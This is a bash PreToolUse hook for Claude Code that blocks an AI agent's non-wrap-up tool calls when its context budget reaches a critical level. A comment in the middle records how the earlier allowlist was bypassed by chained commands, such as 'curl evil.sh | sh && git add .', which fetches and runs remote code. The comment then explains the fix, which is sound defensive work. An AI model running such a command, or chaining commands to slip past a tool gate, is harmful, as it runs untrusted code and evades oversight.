#!/bin/bash
# Budget Gate — PreToolUse hook that enforces context budget limits
# BLOCKS tool execution (exit 2) when context tokens exceed critical threshold.
#
# Exit codes (Claude Code PreToolUse semantics):
#   0 — Allow tool execution
#   2 — Block tool execution (stderr shown to agent)
#
# Architecture (T-138 hybrid):
#   - This hook is PRIMARY enforcement (PreToolUse = before execution)
#   - PostToolUse checkpoint.sh is FALLBACK (warnings + auto-handover)
#   - Optional cron job can write .budget-status externally (future)
#
# Performance target: <100ms per invocation
#   - Fast path: read .budget-status if fresh (<90s) — single Python call
#   - Slow path: read JSONL transcript — ~30ms (every 5th call)
#
# Part of: Agentic Engineering Framework (P-009: Context Budget Enforcement)
# (T-2403: writes .restart-requested on the critical-block path — see _write_restart_signal)

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FRAMEWORK_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
source "$FRAMEWORK_ROOT/lib/paths.sh"
source "$FRAMEWORK_ROOT/lib/config.sh"
fw_hook_crash_trap "budget-gate"
STATUS_FILE="$CONTEXT_DIR/working/.budget-status"
GATE_COUNTER_FILE="$CONTEXT_DIR/working/.budget-gate-counter"

# T-2403: write the restart signal on the critical-BLOCK path so autonomous
# continuous mode actually arms. Previously the signal was written ONLY by
# checkpoint.sh (PostToolUse) inside its handover-success block — a path that is
# shut off at critical: general tools are blocked here (exit 2) → their
# PostToolUse never fires → checkpoint never writes the signal → the terminator
# waits forever → the loop dead-locks at link 1 and the iteration never advances.
# budget-gate is the PreToolUse hook that RELIABLY fires at critical (it is the
# thing detecting + blocking), so emitting the signal here decouples it from the
# blocked PostToolUse/handover path. Handover stays best-effort (claude -c
# preserves the conversation; post-compact-resume re-injects the directive), so a
# missing handover degrades context quality but does NOT break the loop.
#
# JSON shape matches checkpoint.sh:210-212 (timestamp, session_id, reason,
# tokens, optional directive fold from .next-directive.yaml) so claude-fw and
# post-compact-resume consume it identically. The whole body is wrapped so it can
# NEVER break the gate — this hook gates EVERY tool call, and a non-zero/partial
# failure here would block all tools. Called only on the BLOCK path (after the
# `allowed` check), never on the allowed path, so a restart can't fire while the
# agent is still wrapping up (mid-commit / mid-handover). Idempotent: budget-gate
# runs on every call, so the write may repeat while at critical — each repeat
# just refreshes the timestamp of an already-valid signal (the terminator acts on
# first detection, so churn is harmless).
_write_restart_signal() {
    local tokens="${1:-0}"
    {
        local restart_signal="$CONTEXT_DIR/working/.restart-requested"
        local session_id=""
        if [ -f "$CONTEXT_DIR/working/session.yaml" ]; then
            session_id=$(grep "^session_id:" "$CONTEXT_DIR/working/session.yaml" 2>/dev/null | cut -d: -f2 | tr -d ' ') || true
        fi
        # T-2363 directive fold (parity with checkpoint.sh): include the
        # .next-directive.yaml `directive:` value so the resumed session can pick
        # it up. Absent file → JSON shape unchanged (backward-compat).
        local _directive_file="$CONTEXT_DIR/working/.next-directive.yaml"
        local _directive_json=""
        if [ -f "$_directive_file" ]; then
            _directive_json=$(python3 -c "
import yaml, json
try:
    with open('$_directive_file') as f:
        d = yaml.safe_load(f) or {}
    v = d.get('directive')
    if isinstance(v, str) and v.strip():
        print(',\"directive\":' + json.dumps(v.strip()))
except Exception:
    pass
" 2>/dev/null) || _directive_json=""
        fi
        cat > "$restart_signal" << SIGNAL_EOF
{"timestamp":"$(date -u +%Y-%m-%dT%H:%M:%SZ)","session_id":"${session_id:-unknown}","reason":"critical_budget_gate_block","tokens":${tokens:-0}${_directive_json}}
SIGNAL_EOF
    } 2>/dev/null || true
}

# T-2499: the budget-critical auto-restart loop only fires when the session is
# supervised by claude-fw (it consumes the .restart-requested signal this gate
# writes). A plain `claude` launch leaves FW_CLAUDE_FW_SUPERVISED unset → the
# signal is written into the void and the session silently overruns (the 300K→
# 350K bug). This makes that state LOUD at every warn/urgent/critical surface so
# it can never silently disarm the loop again. Emits nothing when supervised.
_supervision_notice() {
    # Agent-facing status line + a suggestion to relay to the operator: only a
    # human can type 'claude-fw' or '/compact' (T-2143 audience axis) — the
    # agent cannot invoke either as a tool call, so pass it along in prose.
    if [ "${FW_CLAUDE_FW_SUPERVISED:-0}" != "1" ]; then
        echo "  ⚠ Unsupervised session (not under claude-fw): the budget auto-restart loop will NOT fire." >&2
        echo "    Tell the operator: relaunch via 'claude-fw' for hands-off recovery, or run '/compact' before critical (see docs/context-compaction.md)." >&2
    fi
}

# Context window size — conservative default, override via FW_CONTEXT_WINDOW.
# Opus 4.6 supports 1M but 300K is a safe default for quality + cost control.
CONTEXT_WINDOW=$(fw_config_int "CONTEXT_WINDOW" 300000)

# Token thresholds (autoCompact disabled — D-027)
TOKEN_WARN=$((CONTEXT_WINDOW * 75 / 100))        # ~75% (225K at 300K)
TOKEN_URGENT=$((CONTEXT_WINDOW * 85 / 100))      # ~85% (255K at 300K)
TOKEN_CRITICAL=$((CONTEXT_WINDOW * 95 / 100))    # ~95% (285K at 300K)

# How often to re-read the transcript (every Nth tool call)
RECHECK_INTERVAL=$(fw_config_int "BUDGET_RECHECK_INTERVAL" 5)

# Max age of .budget-status before considering it stale (seconds)
STATUS_MAX_AGE=$(fw_config_int "BUDGET_STATUS_MAX_AGE" 90)

# Read stdin (JSON from Claude Code)
INPUT=$(cat)

# --- Single Python call: extract tool info + read status + decide ---
# Combines tool_name extraction, status file reading, and command extraction
# into one Python invocation to minimize startup overhead (~60ms vs ~120ms).
RESULT=$(echo "$INPUT" | python3 -c "
import sys, json, time, os

# Parse stdin (tool call JSON)
try:
    data = json.load(sys.stdin)
except:
    data = {}

tool_name = data.get('tool_name', '')
command = data.get('tool_input', {}).get('command', '')

# Read cached status file
status_file = '$STATUS_FILE'
level = 'unknown'
tokens = 0
age = 999

if os.path.exists(status_file):
    try:
        with open(status_file) as f:
            s = json.load(f)
        level = s.get('level', 'unknown')
        tokens = s.get('tokens', 0)
        age = int(time.time()) - s.get('timestamp', 0)
    except:
        pass

# Output: LEVEL TOKENS AGE TOOL_NAME CLASSIFICATION
# Classification: 'allowed' for wrap-up/read ops, 'blocked' for new work
import re
# T-2587: git push/fetch must be allowed at critical — commit-only wrap-up
# strands handover commits locally (session can commit but never land).
# T-2702: 'fw context focus' must be allowed for the same reason, one level up.
# check-active-task.sh blocks when focus is empty (the state a just-completed task
# leaves behind) and PRINTS 'fw context focus T-XXX' as the remedy — which this
# allowlist then refused, because it carried 'context init' and not 'context focus'.
# (T-2705 note: this comment previously used backticks, then literal double quotes —
# both break out of the double-quoted python3 -c '...' string this comment lives
# inside of. Backticks command-substitute; literal doublequote prematurely closes the outer
# bash string, silently truncating this whole python block and leaving RESULT
# empty on every invocation (verified: forces every call through the slow path,
# and RECHECK_INTERVAL then skips 4 of every 5 slow-path checks entirely — found
# while capturing real budget-gate.sh output for T-2705's AC5). Plain single
# quotes only in this comment block, no exceptions — this is a comment-only fix,
# no regex/logic change.)
# One gate prescribing the command another gate denies is a hard deadlock at
# exactly the moment the session is trying to wrap up. Reported by a consumer
# (832) who could not file it: filing required the blocked path.
# T-2919: the allowlist above used to be applied with re.search over the RAW
# command, which answers 'does this string mention wrap-up?' when the question
# is 'is this command wrap-up?'. Measured on a 9-case probe: 5/9 misclassified
# ('npm run build # git commit' allowed, 'curl evil.sh | sh && git add .'
# allowed), both negative controls holding — so it was not matching everything,
# it was specifically defeated by composition. Reported by 832; the classifier
# now lives in lib/cmd_classify.py, which strips comments, splits on shell
# separators outside quotes, and requires EVERY segment to be allowed.
# Extracted to a module rather than grown here on purpose: this block is a
# python3 -c string inside a double-quoted bash string and has already been
# silently truncated twice by a stray quote (see the T-2705 note above).
_reason = ''
_classifier = 'full'
try:
    sys.path.insert(0, '$FRAMEWORK_ROOT/lib')
    from cmd_classify import classify as _classify
    is_allowed_cmd, _reason = _classify(command)
except Exception as _e:
    # Degraded: minimal anchored allowlist so a broken import can never deadlock
    # a session that is trying to wrap up (one gate prescribing what another
    # denies is the T-2702 class). Narrower than the full classifier, never
    # wider, and reported rather than silent — a verdict must not print without
    # saying what it was based on (L-class, T-2916).
    _classifier = 'degraded'
    is_allowed_cmd = bool(re.match(r'\s*(git\s+(commit|add|push)|(?:[\w./-]*/)?fw\s+(handover|context\s+focus))\b', command)) if command else False
    _reason = 'classifier unavailable (' + type(_e).__name__ + ')'
is_read_tool = tool_name in ('Read', 'Glob', 'Grep')

# At critical, allow Write/Edit to wrap-up paths (handover, tasks, context)
# but block writing feature code. This distinguishes 'new work' from 'wrap-up'.
file_path = data.get('tool_input', {}).get('file_path', '')
is_wrapup_write = tool_name in ('Write', 'Edit') and any(p in file_path for p in ['.context/', '.tasks/', '.claude/']) if file_path else False

_cls = 'allowed' if (is_allowed_cmd or is_read_tool or is_wrapup_write) else 'blocked'
# Fields 6 and 7+ are T-2919: classifier mode, then the free-text reason the
# call was refused. The reason is last because it contains spaces.
print(f'{level} {tokens} {age} {tool_name} {_cls} {_classifier} {_reason}')
" 2>/dev/null)

# Parse result
STATUS_LEVEL=$(echo "$RESULT" | awk '{print $1}')
STATUS_TOKENS=$(echo "$RESULT" | awk '{print $2}')
STATUS_AGE=$(echo "$RESULT" | awk '{print $3}')
# shellcheck disable=SC2034 # TOOL_NAME available for debug logging
TOOL_NAME=$(echo "$RESULT" | awk '{print $4}')
CMD_CLASS=$(echo "$RESULT" | awk '{print $5}')
# T-2919: classifier mode + why the call was refused, so the block message can
# name the offending segment instead of just saying no.
CMD_CLASSIFIER=$(echo "$RESULT" | awk '{print $6}')
CMD_REASON=$(echo "$RESULT" | cut -d' ' -f7-)

# Default to safe values if Python failed
STATUS_LEVEL=${STATUS_LEVEL:-unknown}
STATUS_TOKENS=${STATUS_TOKENS:-0}
STATUS_AGE=${STATUS_AGE:-999}
CMD_CLASS=${CMD_CLASS:-blocked}
CMD_CLASSIFIER=${CMD_CLASSIFIER:-unknown}

# T-2919: surface the basis of the verdict at critical, on BOTH the allow and
# the block path. A degraded classifier reaches the same two words as a working
# one; that indistinguishability is the defect class this fix came from.
_classifier_notice() {
    if [ "$CMD_CLASSIFIER" = "degraded" ] || [ "$CMD_CLASSIFIER" = "unknown" ]; then
        echo "  NOTE: command classifier ${CMD_CLASSIFIER} (lib/cmd_classify.py) — minimal allowlist in effect." >&2
    fi
}

# --- Fast path: use cached status if fresh ---
# Only use cached status when fresh (< STATUS_MAX_AGE seconds).
# T-271 fix: stale critical falls through to slow path for re-validation.
# Previous Bug 3 fix blindly trusted stale critical, creating a trap where
# the slow path (which re-reads the actual transcript) could never run after
# compaction or session restart, permanently blocking the agent.
if [ "${STATUS_AGE}" -lt "$STATUS_MAX_AGE" ]; then
    case "$STATUS_LEVEL" in
        ok)
            exit 0
            ;;
        warn)
            echo "Note: Context at ~${STATUS_TOKENS} tokens (~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))%). Commit before starting new work. (docs/context-compaction.md)" >&2
            _supervision_notice
            exit 0
            ;;
        urgent)
            echo "WARNING: Context at ~${STATUS_TOKENS} tokens (~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))%). Do not start new work. Commit and handover." >&2
            echo "  Details: docs/context-compaction.md (budget ladder, what to do at each level)" >&2
            _supervision_notice
            exit 0
            ;;
        critical)
            _classifier_notice
            if [ "$CMD_CLASS" = "allowed" ]; then
                exit 0
            fi
            echo "" >&2
            echo "══════════════════════════════════════════════════════════" >&2
            echo "  SESSION WRAPPING UP (~${STATUS_TOKENS} tokens)" >&2
            echo "══════════════════════════════════════════════════════════" >&2
            echo "" >&2
            echo "  Context is at ~$((STATUS_TOKENS * 100 / CONTEXT_WINDOW))% of context window." >&2
            echo "  Task files already have all essential state. Time to wrap up." >&2
            echo "" >&2
            echo "  ALLOWED: git commit/push, $(_fw_cmd) handover, reading files," >&2
            echo "           Write/Edit to .context/ .tasks/ .claude/" >&2
            echo "  BLOCKED: Write/Edit to source files, Bash (except commit/push/handover)" >&2
            if [ -n "${CMD_REASON// /}" ]; then
                echo "" >&2
                echo "  THIS CALL: ${CMD_REASON}" >&2
                echo "  A chain is allowed only if EVERY segment is — restructure, do not merge." >&2
            fi
            echo "" >&2
            echo "  Action: Commit your work, then run '$(_fw_cmd) handover'" >&2
            echo "  Details: docs/context-compaction.md (budget ladder, what handover/compact capture)" >&2
            _supervision_notice
            echo "══════════════════════════════════════════════════════════" >&2
            echo "" >&2
            _write_restart_signal "$STATUS_TOKENS"   # T-2403: arm autonomous restart
            exit 2
            ;;
    esac
fi

# --- Slow path: re-read transcript every Nth call ---
# T-271: Force immediate re-read when stale critical is detected.
# This prevents the stale-critical trap while still re-validating from
# the actual transcript before deciding to block.
FORCE_RECHECK=0
if [ "$STATUS_LEVEL" = "critical" ] && [ "${STATUS_AGE}" -ge "$STATUS_MAX_AGE" ]; then
    FORCE_RECHECK=1
fi

mkdir -p "$(dirname "$GATE_COUNTER_FILE")"
GATE_COUNT=0
if [ -f "$GATE_COUNTER_FILE" ]; then
    GATE_COUNT=$(tr -d '[:space:]' < "$GATE_COUNTER_FILE" 2>/dev/null) || GATE_COUNT=0
fi
GATE_COUNT=$((GATE_COUNT + 1))
echo "$GATE_COUNT" > "$GATE_COUNTER_FILE"

# Only re-read transcript every Nth call (performance), UNLESS force re-check
if [ "$FORCE_RECHECK" -ne 1 ] && [ $((GATE_COUNT % RECHECK_INTERVAL)) -ne 1 ] && [ "$GATE_COUNT" -ne 1 ]; then
    exit 0
fi

# Find transcript.
# T-2377: prefer the authoritative transcript_path Claude Code passes on stdin
# ($INPUT, captured above). Reconstructing from PROJECT_ROOT is WRONG in git
# worktrees / background jobs — Claude Code keys the transcript dir on the
# session's LAUNCH cwd (the main repo), not the worktree's PROJECT_ROOT, so the
# gate searched an empty/stale sibling dir and never saw the live token count
# (the loop never armed). Reconstruction (T-2375 encoding + T-791 scoping) is the
# fallback when stdin carries no usable path (e.g. manual invocation).
TRANSCRIPT=$(printf '%s' "$INPUT" | python3 -c "
import sys, json, os
try:
    p = json.load(sys.stdin).get('transcript_path') or ''
except Exception:
    p = ''
print(p if (p and os.path.isfile(p)) else '')
" 2>/dev/null) || TRANSCRIPT=""

if [ -z "${TRANSCRIPT:-}" ]; then
    # Fallback: reconstruct (no stdin transcript_path available).
    # Claude Code encodes project paths by replacing every non-alnum char with '-'
    # (e.g. /opt/foo → -opt-foo; /opt/x/.claude/worktrees/y → -opt-x--claude-worktrees-y).
    # T-2392: search ALL candidate project dirs — the PROJECT_ROOT-keyed dir AND
    # the primary-worktree (main-repo) dir Claude Code launched from — and pick the
    # GLOBALLY-newest transcript. PROJECT_ROOT alone is blind in worktree sessions.
    TRANSCRIPT=$(
        while IFS= read -r d; do
            find "$d" -maxdepth 1 -name "*.jsonl" -type f ! -name "agent-*" -print0 2>/dev/null
        done < <(fw_claude_project_dirs) | xargs -r -0 ls -t 2>/dev/null | head -1
    )
fi

if [ -z "${TRANSCRIPT:-}" ]; then
    exit 0
fi

# Read tokens via the shared scan (T-2885, lib/context_tokens.py) — scopes
# entries to the dominant model since the last compact_boundary rather than
# trusting the newest raw entry, so a foreign-model cache-priming call can no
# longer poison this conversation's reading (832 T-401).
# T-1088: pass .session-start-ts so pre-compact entries from the same JSONL
# (claude -c continues the same file) are excluded.
SESSION_START_TS=""
TS_FILE="$CONTEXT_DIR/working/.session-start-ts"
if [ -f "$TS_FILE" ]; then
    SESSION_START_TS=$(tr -d '[:space:]' < "$TS_FILE" 2>/dev/null) || SESSION_START_TS=""
fi
TOKENS=$(tail -c 10000000 "$TRANSCRIPT" 2>/dev/null | python3 "$FRAMEWORK_ROOT/lib/context_tokens.py" "$SESSION_START_TS" 2>/dev/null)
[[ "$TOKENS" =~ ^[0-9]+$ ]] || TOKENS=0

LEVEL="ok"
if [ "$TOKENS" -ge "$TOKEN_CRITICAL" ]; then
    LEVEL="critical"
elif [ "$TOKENS" -ge "$TOKEN_URGENT" ]; then
    LEVEL="urgent"
elif [ "$TOKENS" -ge "$TOKEN_WARN" ]; then
    LEVEL="warn"
fi

# Write status file (fast-path cache for subsequent gate calls)
printf '{"level": "%s", "tokens": %d, "timestamp": %d, "source": "budget-gate"}' \
    "$LEVEL" "$TOKENS" "$(date +%s)" > "$STATUS_FILE" 2>/dev/null || true
LEVEL=${LEVEL:-ok}
TOKENS=${TOKENS:-0}

case "$LEVEL" in
    ok)
        exit 0
        ;;
    warn)
        echo "Note: Context at ${TOKENS} tokens (~$((TOKENS * 100 / CONTEXT_WINDOW))%). Commit before starting new work. (docs/context-compaction.md)" >&2
        _supervision_notice
        exit 0
        ;;
    urgent)
        echo "WARNING: Context at ${TOKENS} tokens (~$((TOKENS * 100 / CONTEXT_WINDOW))%). Do not start new work. Commit and handover." >&2
        echo "  Details: docs/context-compaction.md (budget ladder, what to do at each level)" >&2
        _supervision_notice
        exit 0
        ;;
    critical)
        _classifier_notice
        if [ "$CMD_CLASS" = "allowed" ]; then
            exit 0
        fi
        echo "" >&2
        echo "══════════════════════════════════════════════════════════" >&2
        echo "  SESSION WRAPPING UP (${TOKENS} tokens)" >&2
        echo "══════════════════════════════════════════════════════════" >&2
        echo "" >&2
        echo "  Context is at ~$((TOKENS * 100 / CONTEXT_WINDOW))% of context window." >&2
        echo "  Task files already have all essential state. Time to wrap up." >&2
        echo "" >&2
        echo "  ALLOWED: git commit/push, $(_fw_cmd) handover, reading files," >&2
        echo "           Write/Edit to .context/ .tasks/ .claude/" >&2
        echo "  BLOCKED: Write/Edit to source files, Bash (except commit/push/handover)" >&2
        if [ -n "${CMD_REASON// /}" ]; then
            echo "" >&2
            echo "  THIS CALL: ${CMD_REASON}" >&2
            echo "  A chain is allowed only if EVERY segment is — restructure, do not merge." >&2
        fi
        echo "" >&2
        echo "  Action: Commit your work, then run '$(_fw_cmd) handover'" >&2
        echo "  Details: docs/context-compaction.md (budget ladder, what handover/compact capture)" >&2
        _supervision_notice
        echo "══════════════════════════════════════════════════════════" >&2
        echo "" >&2
        _write_restart_signal "$TOKENS"   # T-2403: arm autonomous restart
        exit 2
        ;;
esac
